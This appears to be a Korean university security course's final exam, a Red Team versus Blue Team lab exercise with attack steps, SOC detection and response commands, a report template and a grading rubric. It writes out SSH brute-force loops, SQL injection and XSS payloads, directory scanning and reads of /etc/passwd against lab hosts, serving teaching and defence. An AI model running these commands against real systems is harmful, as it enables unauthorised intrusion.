# Week 15: 기말고사 - 종합 대응 훈련

## 시험 개요

- **유형**: 팀 실기 시험 (Red Team vs Blue Team)
- **시간**: 180분
- **배점**: 100점
- **구성**: Red Team이 공격 → Blue Team이 SOC 대응
- **교대**: 팀을 바꿔서 2라운드 수행

---

## 시험 구성

| 파트 | 내용 | 배점 | 시간 |
|------|------|------|------|
| Part A | Red Team 공격 계획 및 실행 | 30점 | 60분 |
| Part B | Blue Team SOC 탐지/분석/대응 | 40점 | 80분 |
| Part C | 인시던트 보고서 작성 | 30점 | 40분 |

---

## 규칙

### 허용 행위

| Red Team | Blue Team |
|----------|-----------|
| SSH 접속 시도 (무차별 대입) | 로그 분석 |
| 웹 공격 시도 (SQLi, XSS, 스캐닝) | Wazuh 알림 모니터링 |
| 포트 스캐닝 | Suricata 로그 분석 |
| 공격 도구 사용 (nmap, curl 등) | 방화벽 규칙 추가 (차단) |
| 모의 데이터 유출 시도 | 프로세스/네트워크 조사 |

### 금지 행위

- 실제 파일 삭제/파괴 금지
- 시스템 설정 영구 변경 금지
- 다른 팀의 작업 방해 금지
- DDoS 등 서비스 완전 마비 금지

---

## Part A: Red Team 공격 (30점)

### A-1. 공격 계획 수립 (10점)

ATT&CK 기반 공격 계획을 작성하시오.

```
공격 계획서:
- 대상: (서버 IP)
- 목표: (접근 획득 / 데이터 유출 / 탐지 회피)
- 킬 체인:
  1. 정찰: (방법)
  2. 초기 접근: (방법)
  3. 실행: (방법)
  4. 지속성: (방법)
  5. 목표: (방법)
```

### A-2. 정찰 단계 (5점)

```bash
# 포트 스캐닝
# 대상: opsclaw (192.168.208.142), web (192.168.208.151)
sshpass -p1 ssh user@192.168.208.142 "ss -tlnp | grep LISTEN"

# 서비스 버전 확인
sshpass -p1 ssh user@192.168.208.142 "ssh -V 2>&1"

# 웹 서비스 정보 수집
sshpass -p1 ssh user@192.168.208.151 "curl -s -I http://localhost/ 2>/dev/null | head -10"
```

### A-3. 공격 실행 (15점)

#### 공격 1: SSH 무차별 대입

```bash
# SSH 접속 시도 (의도적으로 실패시키기)
for i in $(seq 1 10); do
  sshpass -pWRONG ssh -o StrictHostKeyChecking=no -o ConnectTimeout=2 \
    testuser@192.168.208.142 "echo fail" 2>/dev/null
done
echo "SSH 공격 시도 완료"
```

#### 공격 2: 웹 공격

```bash
# SQL Injection 시도 (JuiceShop)
curl -s "http://192.168.208.151/rest/products/search?q=test'+OR+1=1--" 2>/dev/null | head -5

# XSS 시도
curl -s "http://192.168.208.151/api/Users/?q=<script>alert(1)</script>" 2>/dev/null | head -5

# 디렉토리 스캐닝
for path in admin login backup config .env .git wp-admin phpmyadmin; do
  code=$(curl -s -o /dev/null -w '%{http_code}' "http://192.168.208.151/$path" 2>/dev/null)
  echo "$path: $code"
done
```

#### 공격 3: 권한 상승 시도

```bash
# sudo 시도 (정상 사용자로)
sshpass -p1 ssh user@192.168.208.142 "sudo -l 2>/dev/null"

# SUID 파일 탐색
sshpass -p1 ssh user@192.168.208.142 "find /usr -perm -4000 -type f 2>/dev/null | head -5"
```

#### 공격 4: 정보 수집

```bash
# 시스템 정보 수집
sshpass -p1 ssh user@192.168.208.142 "cat /etc/passwd | head -10"
sshpass -p1 ssh user@192.168.208.142 "cat /etc/os-release"
sshpass -p1 ssh user@192.168.208.142 "netstat -rn 2>/dev/null || ip route"
```

---

## Part B: Blue Team SOC 대응 (40점)

### B-1. 탐지 (10점)

공격이 진행되는 동안 다음을 모니터링한다:

```bash
# 실시간 모니터링 (터미널 1)
sshpass -p1 ssh user@192.168.208.142 "tail -f /var/log/auth.log" &

# Wazuh 알림 모니터링 (터미널 2)
sshpass -p1 ssh user@192.168.208.152 "tail -f /var/ossec/logs/alerts/alerts.json 2>/dev/null | python3 -c \"
import sys, json
for line in sys.stdin:
    try:
        a = json.loads(line)
        r = a.get('rule',{})
        if r.get('level',0) >= 5:
            print(f'[{r.get(\"level\",0):2d}] {r.get(\"description\",\"\")} | {a.get(\"agent\",{}).get(\"name\",\"\")}')
    except: pass
\""

# Suricata 알림 모니터링 (터미널 3)
sshpass -p1 ssh user@192.168.208.150 "tail -f /var/log/suricata/fast.log" &
```

### B-2. 분석 (15점)

공격 탐지 후 상세 분석을 수행한다:

```bash
# 1. 공격자 IP 식별
echo "=== 공격자 IP 식별 ==="
sshpass -p1 ssh user@192.168.208.142 "grep 'Failed password' /var/log/auth.log 2>/dev/null | \
  awk '{print \$(NF-3)}' | sort | uniq -c | sort -rn | head -5"

# 2. 공격 타임라인 구성
echo "=== 타임라인 ==="
sshpass -p1 ssh user@192.168.208.142 "grep 'Failed\|Accepted' /var/log/auth.log 2>/dev/null | tail -20"

# 3. 웹 공격 분석
echo "=== 웹 공격 ==="
sshpass -p1 ssh user@192.168.208.151 "grep -iE 'union|select|script|alert|\.\./' /var/log/nginx/access.log 2>/dev/null | tail -10"

# 4. Wazuh 고위험 알림 분석
echo "=== Wazuh 고위험 알림 ==="
sshpass -p1 ssh user@192.168.208.152 "cat /var/ossec/logs/alerts/alerts.json 2>/dev/null | python3 -c \"
import sys, json
for line in sys.stdin:
    try:
        a = json.loads(line)
        r = a.get('rule',{})
        if r.get('level',0) >= 8:
            print(f'{a.get(\"timestamp\",\"\")} [{r[\"level\"]}] {r.get(\"description\",\"\")}')
            print(f'  Agent: {a.get(\"agent\",{}).get(\"name\",\"\")}')
            data = a.get('data',{})
            if data.get('srcip'): print(f'  SrcIP: {data[\"srcip\"]}')
            print()
    except: pass
\" 2>/dev/null | tail -30"

# 5. ATT&CK 매핑
echo "=== ATT&CK 매핑 ==="
echo "T1110 - Brute Force (SSH 실패 다수)"
echo "T1190 - Exploit Public-Facing Application (SQLi)"
echo "T1046 - Network Service Discovery (포트 스캔)"
```

### B-3. 대응 (15점)

```bash
# 1. 공격자 IP 차단
echo "=== 차단 조치 ==="
ATTACKER_IP="10.0.0.1"  # 실제 공격자 IP로 변경
echo "명령: sudo nft add rule inet filter input ip saddr $ATTACKER_IP drop"
echo "(실제 실행 여부는 심사 시 판단)"

# 2. OpsClaw로 자동 대응
export OPSCLAW_API_KEY="opsclaw-api-key-2026"

curl -s -X POST http://localhost:8000/projects \
  -H "Content-Type: application/json" \
  -H "X-API-Key: $OPSCLAW_API_KEY" \
  -d '{"name":"incident-response","request_text":"공격 탐지 대응","master_mode":"external"}' 2>/dev/null

IR_ID=$(curl -s http://localhost:8000/projects -H "X-API-Key: $OPSCLAW_API_KEY" | python3 -c "import sys,json; ps=json.load(sys.stdin); print(ps[-1]['id'])" 2>/dev/null)

curl -s -X POST "http://localhost:8000/projects/$IR_ID/plan" -H "X-API-Key: $OPSCLAW_API_KEY" > /dev/null
curl -s -X POST "http://localhost:8000/projects/$IR_ID/execute" -H "X-API-Key: $OPSCLAW_API_KEY" > /dev/null

# 증거 수집 태스크
curl -s -X POST "http://localhost:8000/projects/$IR_ID/execute-plan" \
  -H "Content-Type: application/json" \
  -H "X-API-Key: $OPSCLAW_API_KEY" \
  -d "{
    \"tasks\": [
      {\"order\":1, \"instruction_prompt\":\"grep 'Failed password' /var/log/auth.log | tail -20\", \"risk_level\":\"low\", \"subagent_url\":\"http://localhost:8002\"},
      {\"order\":2, \"instruction_prompt\":\"ss -tnp state established | head -10\", \"risk_level\":\"low\", \"subagent_url\":\"http://localhost:8002\"}
    ],
    \"subagent_url\":\"http://localhost:8002\"
  }" 2>/dev/null | python3 -m json.tool 2>/dev/null

# 3. 모니터링 강화 확인
echo ""
echo "=== 모니터링 상태 ==="
sshpass -p1 ssh user@192.168.208.152 "systemctl is-active wazuh-manager 2>/dev/null"
sshpass -p1 ssh user@192.168.208.150 "systemctl is-active suricata 2>/dev/null"
```

---

## Part C: 인시던트 보고서 (30점)

### 보고서 양식

```
================================================================
종합 인시던트 대응 보고서
================================================================

1. 인시던트 요약
   - 훈련일: 2026-XX-XX
   - Red Team: (팀원)
   - Blue Team: (팀원)
   - 시나리오: Red Team 공격 → Blue Team 대응

2. Red Team 보고
   2.1 공격 계획
       (ATT&CK 기반)
   2.2 실행한 공격
       | No | 공격 유형 | 대상 | 결과 | ATT&CK |
       |----|----------|------|------|--------|
       | 1 | SSH 무차별대입 | opsclaw | 차단됨 | T1110 |
       | ... | ... | ... | ... | ... |
   2.3 성공/실패 분석

3. Blue Team 보고
   3.1 탐지
       - 탐지 시간: HH:MM
       - 탐지 소스: Wazuh/Suricata/로그
       - 탐지한 공격 목록
   3.2 분석
       - 공격자 IP:
       - 공격 유형:
       - 영향 범위:
       - ATT&CK 매핑:
   3.3 대응
       - 격리 조치:
       - 근절 조치:
       - 복구 확인:

4. 타임라인
   | 시간 | Red Team | Blue Team |
   |------|----------|-----------|
   | HH:MM | 정찰 시작 | 모니터링 시작 |
   | HH:MM | SSH 공격 | SSH 공격 탐지 |
   | ... | ... | ... |

5. MTTD/MTTR
   - 탐지 시간 (MTTD): X분
   - 대응 시간 (MTTR): X분

6. 교훈
   - Red Team 관점:
   - Blue Team 관점:
   - 개선 사항:

7. ATT&CK Navigator 매핑
   (관찰된 기법 목록)

================================================================
```

---

## 채점 기준

### Part A: Red Team (30점)

| 항목 | 우수 | 보통 | 미흡 |
|------|------|------|------|
| 공격 계획 | ATT&CK 기반, 5단계 | 3단계 이상 | 계획 없음 |
| 공격 다양성 | 4가지 이상 공격 | 2~3가지 | 1가지 |
| 기술 수준 | 로그 회피 시도 | 기본 공격 | 단순 반복 |

### Part B: Blue Team (40점)

| 항목 | 우수 | 보통 | 미흡 |
|------|------|------|------|
| 탐지 속도 | 5분 이내 | 15분 이내 | 30분 이상 |
| 분석 정확도 | 모든 공격 식별 | 주요 공격 식별 | 일부만 식별 |
| 대응 적절성 | 차단+증거보존 | 차단만 | 대응 없음 |
| ATT&CK 매핑 | 5개 이상 정확 | 3개 이상 | 2개 미만 |

### Part C: 보고서 (30점)

| 항목 | 우수 | 보통 | 미흡 |
|------|------|------|------|
| 완성도 | 모든 섹션 완비 | 주요 섹션 | 불완전 |
| 타임라인 | 분 단위 정확 | 대략적 | 누락 |
| 교훈 | 구체적 개선안 | 일반적 | 미기재 |

---

## 시험 전 체크리스트

```bash
# 전체 환경 확인
echo "=== 서버 접속 ==="
for ip in 192.168.208.142 192.168.208.150 192.168.208.151 192.168.208.152; do
  sshpass -p1 ssh -o StrictHostKeyChecking=no -o ConnectTimeout=3 user@$ip "hostname" 2>/dev/null \
    && echo "$ip: OK" || echo "$ip: FAIL"
done

echo ""
echo "=== 보안 도구 ==="
echo -n "Wazuh: "
sshpass -p1 ssh user@192.168.208.152 "systemctl is-active wazuh-manager 2>/dev/null"
echo -n "Suricata: "
sshpass -p1 ssh user@192.168.208.150 "systemctl is-active suricata 2>/dev/null"

echo ""
echo "=== OpsClaw ==="
curl -s http://localhost:8000/projects -H "X-API-Key: opsclaw-api-key-2026" 2>/dev/null | python3 -c "import sys,json; print(f'Projects: {len(json.load(sys.stdin))}')" 2>/dev/null || echo "Manager API 미응답"
```

---

## 참고

- 오픈 북: 모든 강의 자료 + 인터넷 참고 가능
- 팀 구성: 수업 시작 시 발표 (2~3인 1조)
- 제출물: 인시던트 보고서 (md 또는 txt)
- 이 시험은 학기 전체의 SOC 역량을 종합 검증하는 실전 훈련이다
